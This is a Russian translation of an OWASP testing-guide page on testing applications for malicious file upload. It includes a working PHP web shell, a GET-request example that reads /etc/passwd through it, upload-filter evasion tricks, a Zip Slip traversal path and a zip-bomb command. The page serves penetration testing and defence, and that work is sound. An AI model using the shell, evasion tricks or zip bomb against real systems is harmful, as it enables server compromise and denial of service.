---

layout: col-document
title: WSTG - Latest
tags: WSTG

---

{% include breadcrumb.html %}
# Тестирование загрузки вредоносных файлов

|ID          |
|------------|
|WSTG-BUSL-09|

## Обзор

Многие бизнес-процессы приложений позволяют пользователям загружать в них данные. Хотя проверка входных данных широко применяется для текстовых полей ввода, её сложнее реализовать, когда принимаются файлы. Хотя многие сайты накладывают простые ограничения, на основе списка разрешённых (или заблокированных) расширений, этого недостаточно, чтобы помешать злоумышленникам загружать вредоносное содержимое с допустимым типом файла.

Уязвимости, связанные с загрузкой вредоносных файлов, уникальны тем, что эти «вредоносные» файлы можно легко отклонить, включив бизнес-логику, которая будет сканировать файлы в процессе загрузки и отклонять те, что воспринимаются как вредоносные. Кроме того, это отличается от загрузки непредусмотренных файлов тем, что, хотя его тип и может быть принят, файл всё ещё может оставаться вредоносным.

Наконец, «вредоносный» означает разное для разных систем, например, вредоносные файлы, которые могут эксплуатировать уязвимости SQL-сервера, могут не считаться таковыми в хранилище данных NoSQL.

Приложение может разрешать загрузку вредоносных файлов, содержащих уязвимости или шелл-код, не подвергая их проверке на наличие вредоносных файлов. Вредоносные файлы могут быть обнаружены и остановлены в различных точках архитектуры приложения, таких как: IPS/IDS, антивирусное программное обеспечение сервера приложений или антивирусное сканирование приложением по мере загрузки файлов (возможно, при помощи [SCAP](https://csrc.nist.gov/Projects/Security-Content-Automation-Protocol/)).

### Пример

Типичным примером этой уязвимости является блог или форум, которые позволяют пользователям загружать изображения и другие медиафайлы. Хотя они считаются безопасными, если злоумышленник может загрузить исполняемый код (например, PHP-скрипт), это может позволить ему выполнять команды операционной системы, читать и изменять информацию в файловой системе, получать доступ к базе данных сервера и полностью скомпрометировать сервер.

## Задачи тестирования

- Найти функцию загрузки файлов.
- Проанализировать документацию по проекту, чтобы определить, какие типы файлов считаются приемлемыми, а какие — опасными или вредоносными.
    - Если документация недоступна, то определить, что было бы уместно, исходя из назначения приложения.
- Определить, как обрабатываются загруженные файлы.
- Найти или создать набор вредоносных файлов для тестирования.
- Попробовать загрузить вредоносные файлы в приложение и определить, принимаются ли, и обрабатываются ли они.

## Как тестировать

### Вредоносные типы файлов

Простейшие проверки, которые может выполнить приложение, — определить, что могут быть загружены только доверенные типы файлов.

#### Web-оболочки

Если сервер настроен на выполнение кода, то можно добиться выполнения команды на сервере, загрузив файл, известный как web-оболочка, который позволяет выполнять произвольный код или команды операционной системы. Чтобы эта атака была успешной, файл необходимо загрузить в каталог webroot, а сервер должен быть настроен для выполнения кода.

Загружать такую оболочку на сервер с выходом в Интернет опасно, потому что это позволяет любому, кто знает (или догадывается) о местонахождении оболочки, выполнять код на сервере. Для защиты оболочки от несанкционированного доступа можно использовать ряд методов, таких как:

- Загрузка оболочки со случайно сгенерированным именем.
- Защита оболочки паролем.
- Ограничение подключений к оболочке по IP-адресам.

**Не забудьте удалить оболочку, когда закончите!**

В приведённом ниже примере показана простая оболочка на PHP, которая выполняет команды операционной системы, переданные ей в параметре GET, и доступ к ней возможен только с определённого IP-адреса:

```php
<?php
    if ($_SERVER['REMOTE_HOST'] === "FIXME") { // Укажите свой IP-адрес here
        if(isset($_REQUEST['cmd'])){
            $cmd = ($_REQUEST['cmd']);
            echo "<pre>\n";
            system($cmd);
            echo "</pre>";
        }
    }
?>
```

Как только оболочка загружена (со случайным именем), вы можете выполнять команды операционной системы, передавая их в параметре GET `cmd`:

`https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd`

#### Уклонение от фильтра

Первым делом надо определить, что фильтры разрешают или блокируют, и где они реализованы. Если ограничения применяются на стороне клиента с помощью JavaScript, то их можно банально обойти с помощью перехватывающего прокси.

Если фильтрация выполняется на стороне сервера, то могут быть предприняты различные способы ее обхода, в том числе:

- Измените значение `Content-Type` на `image/jpeg` в HTTP-запросе.
- Измените расширения на менее распространённые, например, `file.php5`, `file.shtml`, `file.asa`, `file.jsp`, `file.jspx`, `file.aspx`, `file.asp`, `file.phtml`, `file.cshtml`
- Измените некоторые буквы в расширении на заглавные, например, `file.PhP` или `file.AspX`
- Если в запросе содержится несколько наименований файлов, замените их разными значениями.
- Используйте специальные завершающие символы, например, пробелы, точки или пустые (null), например, `file.asp...`, `file.php;jpg`, `file.asp%00.jpg`, `1.jpg%00.php`
- В плохо настроенных версиях nginx при загрузке файла, например, `test.jpg/x.php` может разрешаться его выполнение как `x.php`.

### Вредоносное содержимое файла

После проверки типа файла важно также убедиться, что безопасно его содержимое. Это значительно сложнее, так как необходимые этапы будут разными в зависимости от разрешённых типов файлов.

#### Вредоносный код

Обычно приложения должны сканировать загружаемые файлы с помощью антивирусного программного обеспечения, чтобы убедиться, что они не содержат ничего вредоносного. Самый простой способ проверить это — использовать [тестовый файл EICAR](https://www.eicar.org/?page_id=3950), который представляет собой безопасный файл, помечаемый как вредоносный всеми антивирусными программами.

В зависимости от типа приложения может потребоваться проверка на наличие других опасных типов файлов, таких как документы Office, содержащие вредоносные макросы. Для создания вредоносных файлов различных форматов можно использовать такие инструменты, как [Metasploit Framework](https://github.com/rapid7/metasploit-framework) и [Social Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit).

Когда этот файл загружен, он должен быть обнаружен и помещён в карантин или удалён приложением. В зависимости от того, как приложение обрабатывает файл, может быть неочевидно, произошло ли это.

#### Обход каталогов через архивы (Zip Slip)

Если приложение извлекает архивы (например, Zip-файлы), может быть возможна запись в непредусмотренные места с использованием обхода каталога. Это можно эксплуатировать, загружая вредоносный zip-файл, содержащий пути перемещения по файловой системе, например, последовательности `..\..\..\..\shell.php`. Этот метод обсуждается в [snyk advisory](https://snyk.io/research/zip-slip-vulnerability).

#### Zip-бомбы

[Zip-бомба](https://ru.wikipedia.org/wiki/Zip-%D0%B1%D0%BE%D0%BC%D0%B1%D0%B0) (более известная как декомпрессионная бомба) — это архивный файл, содержащий большой объём данных. Он предназначен для вызова отказа в обслуживании путём исчерпания дискового пространства или памяти целевой системы, которая пытается извлечь архив. Обратите внимание, что хотя формат Zip является наиболее ярким примером этого, другие форматы также подвержены влиянию, включая gzip (который часто используется для сжатия данных при передаче).

На простейшем уровне Zip-бомбу можно создать, сжав большой файл, состоящий из одного символа. В приведенном ниже примере показано, как создать файл размером 1 МБ, который будет распаковываться до 1 ГБ:

```bash
dd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip
```

Существует ряд методов, которые можно использовать для достижения гораздо более высоких коэффициентов сжатия, в том числе несколько степеней сжатия, [злоупотребление форматом Zip](https://www.bamsoftware.com/hacks/zipbomb/) и [квайнами](https://research.swtch.com/zip) (которые представляют собой архивы, содержащие копию самих себя, вызывающими бесконечную рекурсию).

Успешная атака Zip-бомбы приводит к отказу в обслуживании, а также может привести к увеличению расходов, если используется облачная платформа с автоматическим масштабированием. **Не проводите такого рода атаки, если вы не учли эти риски и не получили на это письменного разрешения.**

#### XML-файлы

XML-файлы имеют ряд потенциальных уязвимостей, например, внешние сущности (англ.: eXternal Entities, XXE) и атаки типа «отказ в обслуживании», такие как атака [миллиард смайликов](https://en.wikipedia.org/wiki/Billion_laughs_attack).

Они подробно обсуждаются в разделе [Тестирование XML-инъекций](../07-Input_Validation_Testing/07-Testing_for_XML_Injection.md).

#### Другие форматы файлов

Многие другие форматы файлов также имеют определённые проблемы безопасности, которые необходимо учитывать, например:

- CSV-файлы могут допускать [атаки CSV-инъекций](https://owasp.org/www-community/attacks/CSV_Injection).
- Файлы Office могут содержать вредоносные макросы или код PowerShell.
- PDF-файлы могут содержать вредоносный код JavaScript (ECMAScript).

Разрешённые форматы файлов должны быть тщательно проверены на предмет потенциально опасной функциональности, и, по возможности, должны быть предприняты попытки эксплуатировать это во время тестирования.

### Анализ исходного кода

Если поддерживается функция загрузки файлов, в исходном коде обычно используются следующие API/методы:

- Java: `new file`, `import`, `upload`, `getFileName`, `Download`, `getOutputString`
- C/C++: `open`, `fopen`
- PHP: `move_uploaded_file()`, `Readfile`, `file_put_contents()`, `file()`, `parse_ini_file()`, `copy()`, `fopen()`, `include()`, `require()`

## Связанные сценарии тестирования

- [Тестирование обработки расширений файлов на наличие чувствительной информации](../02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information.md)
- [Тестирование XML-инъекций](../07-Input_Validation_Testing/07-Testing_for_XML_Injection.md)
- [Тестирование загрузки файлов непредусмотренных типов](08-Test_Upload_of_Unexpected_File_Types.md)

## Меры защиты

Полностью защитить от загрузки вредоносных файлов может оказаться сложной задачей, и конкретные требуемые действия в зависимости от типов загружаемых файлов будут различаться, а также от того, как файлы обрабатываются или анализируются на сервере. Более подробно это обсуждается в [Памятке по загрузке файлов](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html).

## Инструменты

- Функциональность генерации полезной нагрузки в Metasploit
- Перехватывающий прокси

## Ссылки

- [OWASP - File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [Why File Upload Forms are a Major Security Threat](https://www.acunetix.com/websitesecurity/upload-forms-threat/)
- [8 Basic Rules to Implement Secure File Uploads](https://software-security.sans.org/blog/2009/12/28/8-basic-rules-to-implement-secure-file-uploads)
- [Stop people uploading malicious PHP files via forms](https://stackoverflow.com/questions/602539/stop-people-uploading-malicious-php-files-via-forms)
- [How to Tell if a File is Malicious](https://web.archive.org/web/20210710090809/https://www.techsupportalert.com/content/how-tell-if-file-malicious.htm)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [Implementing Secure File Upload](https://infosecauditor.wordpress.com/tag/malicious-file-upload/)
- [Metasploit Generating Payloads](https://www.offensive-security.com/metasploit-unleashed/Generating_Payloads)
